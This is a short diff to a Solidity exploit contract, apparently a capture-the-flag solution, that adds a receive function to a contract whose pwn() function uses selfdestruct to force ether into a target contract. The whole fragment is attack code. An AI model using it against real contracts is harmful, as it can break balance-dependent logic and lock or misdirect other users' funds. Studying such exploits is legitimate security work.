@@ -12,6 +12,8 @@ contract SevenEthExploit {
         target = _target;
     }
 
+    receive() external payable {}
+
     function pwn() external payable {
         selfdestruct(payable(target));
     }
